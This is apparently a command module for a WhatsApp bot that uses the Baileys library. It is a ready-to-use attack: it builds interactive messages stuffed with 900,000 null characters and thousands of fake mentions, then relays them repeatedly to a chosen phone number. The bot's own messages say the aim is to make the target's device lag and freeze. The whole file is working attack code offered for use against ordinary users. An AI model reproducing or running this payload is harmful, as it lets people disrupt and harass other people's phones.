const { generateWAMessageFromContent } = require('@whiskeysockets/baileys');

async function Delayedx(sura, target) {
  let Maklowh = generateWAMessageFromContent(
    target,
    {
      groupStatusMessageV2: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "Delayed",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "address_message",
              paramsJson: JSON.stringify({
                "values": {
                  "in_pin_code": "999999",
                  "building_name": "visi",
                  "landmark_area": "X",
                  "address": "Maklowh",
                  "tower_number": "Maklowh",
                  "city": "arab",
                  "name": "Maklowh",
                  "phone_number": "999999999999",
                  "house_number": "xxx",
                  "floor_number": "smkui",
                  "state": "Maklowh | " + "\u0000".repeat(900000)
                }
              }),
              version: 3
            }
          }
        }
      }
    },
    {
      userJid: target,
      quoted: null
    }
  );

  await sura.relayMessage(target, Maklowh.message, {
    participant: { jid: target },
    messageId: Maklowh.key.id
  });
}

async function gsGlx(sura, target, zid = true) {
  for (let z = 0; z < 10; z++) {
    let msg = generateWAMessageFromContent(target, {
      interactiveResponseMessage: {
        contextInfo: {
          mentionedJid: Array.from({ length: 2000 }, (_, y) => `6285983729${y + 1}@s.whatsapp.net`)
        }, 
        body: {
          text: "# JesterNovaZ",
          format: "DEFAULT"
        },
        nativeFlowResponseMessage: {
          name: (["address_message", "call_permission_request", "galaxy_message"][(z + (Math.random() < 0.5 ? 1 : 0)) % 3]),
          paramsJson: `{"flow_cta":"${"\u0000".repeat(900000)}"}`,
          version: 3
        }
      }
    }, {});
  
    await sura.relayMessage(target, {
      groupStatusMessageV2: {
        message: msg.message
      }
    }, zid ? { messageId: msg.key.id, participant: { jid: target } } : { messageId: msg.key.id });
  }
}

module.exports = {
    name: 'delay',
    aliases: ['glitch', 'strike', 'overload', 'bug'],
    run: async (King, m, { args, prefix, command, reply, isCreator }) => {
        
        if (!isCreator) return reply("⚠️ *Access Denied:* Brainwave V3 Core Protocols are restricted to Owner only.");

        let target;
        if (m.quoted) {
            target = m.quoted.sender;
        } else if (m.mentionedJid && m.mentionedJid[0]) {
            target = m.mentionedJid[0];
        } else if (args[0]) {
            target = args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net';
        } else {
            return reply(`⚠️ *Syntax Error:*\n_Reply to a user, tag them, or provide a number to inject payload._`);
        }

        try {
            await King.sendMessage(m.chat, { react: { text: '☠️', key: m.key } });
            await reply(`☢️ *𝗕𝗥𝗔𝗜𝗡𝗪𝗔𝗩𝗘 𝗩𝟯 𝗔𝗖𝗧𝗜𝗩𝗔𝗧𝗘𝗗*\n\n_Injecting highly concentrated delayed payloads to target..._\n_Target ID: ${target.split('@')[0]}_`);

            await Delayedx(King, target);
            await gsGlx(King, target);

            await King.sendMessage(m.chat, { react: { text: '☣️', key: m.key } });
            reply(`✅ *𝗦𝗬𝗦𝗧𝗘𝗠 𝗢𝗩𝗘𝗥𝗟𝗢𝗔𝗗 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘*\n_Target device should now experience heavy UI delay and rendering lag._`);

        } catch (error) {
            console.error("Brainwave V3 Payload Error:", error);
            reply("❌ *System Fault:* Payload injection failed. Target might have immunity protocols.");
        }
    }
}
